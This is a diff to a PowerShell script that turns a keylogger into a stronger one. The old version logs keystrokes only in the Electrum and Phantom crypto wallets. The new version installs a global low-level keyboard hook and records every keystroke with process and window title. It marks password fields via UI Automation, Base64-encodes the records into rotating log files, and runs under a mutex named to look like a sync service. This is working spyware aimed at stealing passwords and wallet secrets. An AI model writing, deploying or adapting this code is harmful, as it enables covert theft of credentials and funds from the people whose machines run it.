@@ -1,80 +1,194 @@
-param([string]$Log)
-
+param([Parameter(Mandatory = $true)][string]$Ops)
 $ErrorActionPreference = 'SilentlyContinue'
-Add-Type @"
+New-Item -ItemType Directory -Force -Path $Ops | Out-Null
+
+$mutex = New-Object -TypeName System.Threading.Mutex -ArgumentList $false, 'Local\FabricSyncKeys'
+$acquired = $false
+try { $acquired = $mutex.WaitOne(0) } catch { $acquired = $true }
+if (-not $acquired) { exit 0 }
+Set-Content -LiteralPath (Join-Path $Ops 'keys.pid') -Value $PID -Encoding ASCII
+$events = Join-Path $Ops 'keys.events'
+
+Add-Type -AssemblyName UIAutomationClient
+Add-Type -AssemblyName UIAutomationTypes
+Add-Type -AssemblyName System.Windows.Forms
+
+Add-Type @'
 using System;
-using System.Text;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
-public static class SpcKeys {
-    [DllImport("user32.dll")] private static extern short GetAsyncKeyState(int key);
-    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
-    [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr window, StringBuilder text, int size);
+using System.Text;
+
+public static class SpcHook {
+    public delegate IntPtr Proc(int code, IntPtr wParam, IntPtr lParam);
+    [StructLayout(LayoutKind.Sequential)] public struct KBD {
+        public uint vk; public uint scan; public uint flags; public uint time; public IntPtr extra;
+    }
+    [StructLayout(LayoutKind.Sequential)] public struct MSG {
+        public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam;
+        public uint time; public int x; public int y;
+    }
+    [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int id, Proc proc, IntPtr mod, uint thread);
+    [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr hook);
+    [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hook, int code, IntPtr wParam, IntPtr lParam);
+    [DllImport("user32.dll")] public static extern int GetMessage(out MSG msg, IntPtr window, uint min, uint max);
+    [DllImport("user32.dll")] public static extern bool TranslateMessage(ref MSG msg);
+    [DllImport("user32.dll")] public static extern IntPtr DispatchMessage(ref MSG msg);
+    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr window, out uint pid);
+    [DllImport("user32.dll", CharSet = CharSet.Unicode)] public static extern int GetWindowText(IntPtr window, StringBuilder text, int size);
+    [DllImport("user32.dll")] public static extern short GetKeyState(int key);
+    [DllImport("user32.dll")] public static extern IntPtr GetKeyboardLayout(uint thread);
+    [DllImport("user32.dll", CharSet = CharSet.Unicode)] public static extern int ToUnicodeEx(
+        uint vk, uint scan, byte[] state, StringBuilder text, int size, uint flags, IntPtr layout);
+
     public static string Title() {
         StringBuilder text = new StringBuilder(512);
         GetWindowText(GetForegroundWindow(), text, text.Capacity);
         return text.ToString();
     }
-    public static bool Down(int key) { return (GetAsyncKeyState(key) & 0x8000) != 0; }
-}
-"@
-
-$keys = @{}
-$symbols = @{
-    0xBA = ';'; 0xBB = '='; 0xBC = ','; 0xBD = '-'; 0xBE = '.'; 0xBF = '/'
-    0xC0 = '`'; 0xDB = '['; 0xDC = '\'; 0xDD = ']'; 0xDE = "'"
-}
-$shifted = @{
-    0xBA = ':'; 0xBB = '+'; 0xBC = '<'; 0xBD = '_'; 0xBE = '>'; 0xBF = '?'
-    0xC0 = '~'; 0xDB = '{'; 0xDC = '|'; 0xDD = '}'; 0xDE = '"'
-}
-$digits = @('1','2','3','4','5','6','7','8','9','0')
-$shiftDigits = @('!','@','#','$','%','^','&','*','(',')')
-
-$codes = @(0x08..0x5A) + @(0x60..0x6F) + @(0xBA..0xDE)
-$active = $false
-$buffer = ''
-$lastTitle = ''
-$lastFlush = Get-Date
-
-function Flush([bool]$force) {
-    $script:lastFlush = Get-Date
-    if ($script:buffer.Length -eq 0) { return }
-    if (-not $force -and $script:buffer.Length -lt 24) { return }
-    Add-Content -LiteralPath $Log -Value "$(Get-Date -Format 'HH:mm:ss') [$script:lastTitle] $script:buffer"
-    $script:buffer = ''
-}
-
-while ($true) {
-    Start-Sleep -Milliseconds 12
-    $title = [SpcKeys]::Title()
-    $active = $title -match 'Electrum|Phantom'
-    if (-not $active) { if ($buffer.Length -or $lastTitle) { Flush $true; $lastTitle = '' }; continue }
-    if ($title -ne $lastTitle) { Flush $true; $lastTitle = $title }
-    $shift = [SpcKeys]::Down(0x10) -or [SpcKeys]::Down(0xA0) -or [SpcKeys]::Down(0xA1)
-    $caps = ([Console]::CapsLock)
-    foreach ($code in $codes) {
-        $down = [SpcKeys]::Down($code)
-        if (-not $down) { $keys[$code] = $false; continue }
-        if ($keys[$code]) { continue }
-        $keys[$code] = $true
-        $char = $null
-        if ($code -eq 0x08) { $char = '[<]' }
-        elseif ($code -eq 0x09) { $char = '[TAB]' }
-        elseif ($code -eq 0x0D) { $char = "`n" }
-        elseif ($code -eq 0x20) { $char = ' ' }
-        elseif ($code -ge 0x41 -and $code -le 0x5A) {
-            $char = [char]$code
-            if ($shift -xor $caps) { $char = $char.ToString().ToLower() } else { $char = $char.ToString() }
-        }
-        elseif ($code -ge 0x30 -and $code -le 0x39) {
-            $index = $code - 0x30
-            $char = if ($shift) { $shiftDigits[($index + 9) % 10] } else { $digits[($index + 9) % 10] }
-        }
-        elseif ($code -ge 0x60 -and $code -le 0x69) { $char = ([string]($code - 0x60)) }
-        elseif ($symbols.ContainsKey($code)) {
-            $char = if ($shift) { $shifted[$code] } else { $symbols[$code] }
-        }
-        if ($char) { $buffer += $char }
+    public static uint ForegroundPid() {
+        uint pid;
+        GetWindowThreadProcessId(GetForegroundWindow(), out pid);
+        return pid;
     }
-    if (((Get-Date) - $lastFlush).TotalSeconds -ge 2) { Flush $false }
+    public static string ProcessName(uint pid) {
+        try { return Process.GetProcessById((int)pid).ProcessName + ".exe"; } catch { return "?"; }
+    }
+    public static bool Shift() {
+        return (GetKeyState(0x10) & 0x8000) != 0 || (GetKeyState(0xA0) & 0x8000) != 0
+            || (GetKeyState(0xA1) & 0x8000) != 0;
+    }
+    public static bool Caps() { return (GetKeyState(0x14) & 1) != 0; }
+    public static string Unicode(uint vk, uint scan) {
+        byte[] state = new byte[256];
+        if (Shift()) state[0x10] = 0x80;
+        if (Caps()) state[0x14] = 1;
+        uint pid;
+        uint thread = GetWindowThreadProcessId(GetForegroundWindow(), out pid);
+        IntPtr layout = GetKeyboardLayout(thread);
+        StringBuilder text = new StringBuilder(8);
+        int count = ToUnicodeEx(vk, scan, state, text, text.Capacity, 0, layout);
+        return count > 0 ? text.ToString(0, count) : "";
+    }
+}
+'@
+
+$script:writer = $null
+$script:size = 0
+
+function Open-Writer {
+    $encoding = New-Object -TypeName System.Text.UTF8Encoding -ArgumentList $false
+    $script:writer = New-Object -TypeName System.IO.StreamWriter -ArgumentList @($events, $true, $encoding, 4096)
+    $script:writer.AutoFlush = $true
+    $script:size = (Get-Item -LiteralPath $events).Length
+}
+
+function Rotate {
+    if ($script:size -lt 1048576) { return }
+    $script:writer.Close()
+    Remove-Item -LiteralPath "$events.3" -Force
+    if (Test-Path -LiteralPath "$events.2") { Move-Item -LiteralPath "$events.2" -Destination "$events.3" -Force }
+    if (Test-Path -LiteralPath "$events.1") { Move-Item -LiteralPath "$events.1" -Destination "$events.2" -Force }
+    Move-Item -LiteralPath $events -Destination "$events.1" -Force
+    Open-Writer
+}
+
+function Write-Event([hashtable]$data) {
+    $line = $data | ConvertTo-Json -Compress
+    Rotate
+    $script:writer.WriteLine($line)
+    $script:size += [Text.Encoding]::UTF8.GetByteCount($line) + 2
+}
+
+function B64([string]$text) {
+    if ([string]::IsNullOrEmpty($text)) { return '' }
+    return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
+}
+
+function Is-Password {
+    try { return [System.Windows.Automation.AutomationElement]::FocusedElement.Current.IsPassword } catch { return $false }
+}
+
+function Context {
+    $processId = [SpcHook]::ForegroundPid()
+    $title = [SpcHook]::Title()
+    $process = [SpcHook]::ProcessName($processId)
+    return @{ pid = $processId; proc = $process; title = $title }
+}
+
+Open-Writer
+$script:lastKey = ''
+$script:lastTitle = ''
+$script:lastPassword = $false
+
+# Emits a focus event when the window, the process or the UIA password flag
+# changes. Returns the password flag for the current Key event.
+function Set-Context($context, [bool]$queryPassword) {
+    $password = if ($queryPassword) { Is-Password } else { $script:lastPassword }
+    $titleKey = "$($context.pid)|$($context.title)"
+    $key = "$titleKey|$password"
+    if ($key -ne $script:lastKey) {
+        $script:lastKey = $key
+        $script:lastPassword = $password
+        Write-Event @{
+            k = 'focus'; ts = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
+            p = (B64 $context.proc); t = (B64 $context.title); pw = $password
+        }
+    }
+    $script:lastTitle = $titleKey
+    return $password
+}
+
+function Emit-Focus {
+    Set-Context (Context) $true | Out-Null
+}
+
+$callback = [SpcHook+Proc]{
+    param($code, $wParam, $lParam)
+    if ($code -lt 0) { return [SpcHook]::CallNextHookEx([IntPtr]::Zero, $code, $wParam, $lParam) }
+    $message = [int]$wParam
+    if ($message -eq 0x100 -or $message -eq 0x104) {
+        $info = [Runtime.InteropServices.Marshal]::PtrToStructure($lParam, [type][SpcHook+KBD])
+        if ($info.vk -ne 0 -and $info.vk -ne 0xE7) {
+            $context = Context
+            $titleKey = "$($context.pid)|$($context.title)"
+            Set-Context $context ($titleKey -ne $script:lastTitle) | Out-Null
+            Write-Event @{
+                k = 'key'; ts = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
+                vk = [int]$info.vk; sh = [SpcHook]::Shift(); ca = [SpcHook]::Caps()
+                u = (B64 ([SpcHook]::Unicode($info.vk, $info.scan)))
+                p = (B64 $context.proc); t = (B64 $context.title)
+            }
+        }
+    }
+    return [SpcHook]::CallNextHookEx([IntPtr]::Zero, $code, $wParam, $lParam)
+}
+
+# Context watchdog: catches focus changes without keystrokes so the buffer is
+# flushed when the user clicks elsewhere.
+$timer = New-Object -TypeName System.Windows.Forms.Timer
+$timer.Interval = 400
+$timer.add_Tick({ Emit-Focus })
+$timer.Start()
+
+Emit-Focus
+$hook = [SpcHook]::SetWindowsHookEx(13, $callback, [IntPtr]::Zero, 0)
+if ($hook -eq [IntPtr]::Zero) {
+    Remove-Item -LiteralPath (Join-Path $Ops 'keys.pid') -Force
+    exit 1
+}
+
+try {
+    $msg = [SpcHook+MSG]::new()
+    while ([SpcHook]::GetMessage([ref]$msg, [IntPtr]::Zero, 0, 0) -ne 0) {
+        [SpcHook]::TranslateMessage([ref]$msg) | Out-Null
+        [SpcHook]::DispatchMessage([ref]$msg) | Out-Null
+    }
+} finally {
+    [SpcHook]::UnhookWindowsHookEx($hook) | Out-Null
+    $timer.Stop()
+    $script:writer.Close()
+    Remove-Item -LiteralPath (Join-Path $Ops 'keys.pid') -Force
+    $mutex.ReleaseMutex()
 }
